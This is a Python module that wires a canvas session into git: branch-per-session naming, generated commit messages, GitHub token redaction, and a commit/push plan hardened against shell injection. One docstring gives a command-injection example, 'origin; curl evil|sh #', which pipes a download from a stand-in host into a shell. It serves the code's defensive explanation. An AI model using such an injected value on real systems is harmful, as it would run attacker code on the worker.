"""Canvas git integration — branch-per-session, commit, push (PRD-170 S5).

The canvas session commits and pushes through the EXISTING ``workspace_git``
surface (worker POST /git → executor). This module holds the pure, security-
critical glue:

  * ``canvas_branch_name`` — the default branch for a session, ``canvas/<id>``;
  * ``generate_commit_message`` — a generated, EDITABLE commit message derived
    from a git status/diff summary (the UI shows it pre-filled and lets the user
    change it before committing);
  * ``redact_token`` / ``build_authenticated_remote`` — token handling. Push
    uses a GitHub App installation token (PRD-165 ``resolve_github_token``), and
    **no token material ever reaches logs, errors, or returned payloads** — the
    PRD-154 S12 discipline, re-applied here (its test class is re-run against
    this module). Author/committer identity is the platform actor (PRD-168).

Pure stdlib + config — no DB, no container. The commit-message generator and the
redaction are unit-tested directly; the live commit+push e2e is CI/Docker.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import List, Optional

# A generic "credentials in a URL" matcher: https://<user-or-token>[:secret]@host
# Catches the authed-clone-URL leak class regardless of the specific token value
# (belt-and-braces alongside the exact-value replacement below).
_URL_CRED_RE = re.compile(r"(https?://)([^/@\s]+)@")

# GitHub token shapes (ghp_, gho_, ghs_, ghu_, github_pat_) — redact even a bare
# token that appears without a URL (e.g. echoed in an auth-failed message).
_GH_TOKEN_RE = re.compile(r"\b(gh[posu]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,})\b")


def canvas_branch_name(session_id: str) -> str:
    """Default branch for a canvas session: ``canvas/<session-id>``.

    The session id is already an internal, non-secret token; we still slugify to
    a safe git ref (no spaces, no ``..``, no leading/trailing separators).
    """
    slug = re.sub(r"[^A-Za-z0-9._-]+", "-", (session_id or "").strip())
    slug = re.sub(r"\.\.+", ".", slug).strip("-./") or "session"
    return f"canvas/{slug}"


def redact_token(text: str, token: Optional[str] = None) -> str:
    """Strip credential material from *text* before it is logged or returned.

    Three passes: the exact token value (when known), any ``creds@host`` URL
    userinfo, and any GitHub-shaped token literal. Idempotent and safe on text
    that contains no secrets.
    """
    if not text:
        return text
    out = text
    if token:
        out = out.replace(f"{token}@", "***@").replace(token, "***")
    out = _URL_CRED_RE.sub(r"\1***@", out)
    out = _GH_TOKEN_RE.sub("***", out)
    return out


def build_authenticated_remote(remote_url: str, token: Optional[str]) -> str:
    """Return an HTTPS remote URL with the token injected for a push.

    Only rewrites HTTPS GitHub URLs; anything else is returned unchanged. The
    RESULT contains the token and must NEVER be logged — callers log the
    ``redact_token``-cleaned form.
    """
    if not token or not remote_url.startswith("https://") or "github.com" not in remote_url:
        return remote_url
    return remote_url.replace("https://", f"https://{token}@", 1)


@dataclass(frozen=True)
class CommitContext:
    """Non-secret inputs to the commit-message generator."""

    changed_paths: List[str]
    branch: str
    # Optional free-text intent from the session (e.g. the user's ask). Never a
    # secret — it is the task instruction, not credentials.
    intent: Optional[str] = None


_TYPE_BY_PREFIX = (
    ("test", ("test/", "tests/", "spec/")),
    ("docs", ("docs/", "README", "readme")),
    ("ci", (".github/", "ci/")),
    ("build", ("Dockerfile", "package.json", "requirements", "pyproject", "Makefile")),
)


def _infer_type(paths: List[str]) -> str:
    """Best-effort conventional-commit type from the changed paths."""
    if not paths:
        return "chore"
    for ctype, prefixes in _TYPE_BY_PREFIX:
        if all(any(p.startswith(pre) or pre in p for pre in prefixes) for p in paths):
            return ctype
    return "feat" if any(not p.startswith(("test", "docs")) for p in paths) else "chore"


def _summarize_scope(paths: List[str]) -> str:
    """A short scope hint: the common top-level dir, or the single file name."""
    if len(paths) == 1:
        name = paths[0].rsplit("/", 1)[-1]
        return name
    tops = {p.split("/", 1)[0] for p in paths if p}
    if len(tops) == 1:
        return next(iter(tops))
    return f"{len(paths)} files"


def generate_commit_message(ctx: CommitContext) -> str:
    """Generate an EDITABLE conventional-commit message from the change context.

    The UI pre-fills this; the user may rewrite it before committing. Deterministic
    (no LLM) so it is unit-testable and never blocks on a model call. Carries no
    secret material — only paths + the (non-secret) intent.
    """
    paths = [p for p in (ctx.changed_paths or []) if p]
    ctype = _infer_type(paths)
    scope = _summarize_scope(paths)

    if ctx.intent:
        subject = ctx.intent.strip().splitlines()[0][:72]
    elif len(paths) == 1:
        subject = f"update {scope}"
    else:
        subject = f"update {scope}"

    header = f"{ctype}: {subject}"

    body_lines = ["", "Changed files:"]
    for p in paths[:20]:
        body_lines.append(f"- {p}")
    if len(paths) > 20:
        body_lines.append(f"- ... and {len(paths) - 20} more")

    return "\n".join([header, *body_lines]).strip() + "\n"


def _shell_quote(value: str) -> str:
    """Single-quote a value for a git CLI arg string (POSIX)."""
    return "'" + value.replace("'", "'\\''") + "'"


# A git remote is either a short name (origin, upstream) or a URL. This allowlist
# admits both while rejecting shell metacharacters — defense in depth so a bad
# value can never reach the worker's shell-string command even if quoting were to
# regress. (No spaces, ``;``, ``|``, ``&``, ``$``, backticks, quotes, parens.)
_REMOTE_RE = re.compile(r"^[A-Za-z0-9._:@/\-]+$")


def _validate_remote(remote: str) -> str:
    """Return *remote* if it is a safe git remote name/URL, else raise.

    The worker executes ``git push {args}`` as a SHELL STRING, so an unvalidated,
    caller-supplied remote (e.g. ``origin; curl evil|sh #``) would be command
    injection. This is the first of two gates; ``plan_commit_push`` also quotes.
    """
    value = (remote or "").strip()
    if not value or not _REMOTE_RE.match(value):
        raise ValueError(f"Invalid git remote: {remote!r}")
    return value


@dataclass(frozen=True)
class GitStep:
    """One ``workspace_git`` invocation: operation + arg string."""

    operation: str
    args: str = ""


def plan_commit_push(
    session_id: str,
    commit_message: str,
    remote: str = "origin",
) -> List[GitStep]:
    """The ordered git steps to land a canvas session's work on its own branch.

    Reuses the existing ``workspace_git`` verbs (checkout/add/commit/push) — no
    new git surface. The branch is ``canvas/<session-id>``; the push sets
    upstream so the PR-open link works. The commit message is passed as an
    already-resolved, EDITABLE string (the UI supplies it).

    Security: the worker runs these arg strings as a SHELL command
    (``git {operation} {args}`` → ``execute_command``), so EVERY interpolated
    value (branch, message, AND remote) is single-quoted, and ``remote`` is
    additionally allowlist-validated (``_validate_remote``) — two gates against
    command injection. Token handling is NOT in the plan — the push token is
    injected server-side against the resolved remote URL
    (``build_authenticated_remote``) and never appears in these args or logs.
    """
    branch = canvas_branch_name(session_id)
    msg = commit_message.strip() or "chore: canvas session changes"
    safe_remote = _validate_remote(remote)
    return [
        GitStep("checkout", f"-B {_shell_quote(branch)}"),
        GitStep("add", "-A"),
        GitStep("commit", f"-m {_shell_quote(msg)}"),
        GitStep("push", f"-u {_shell_quote(safe_remote)} {_shell_quote(branch)}"),
    ]
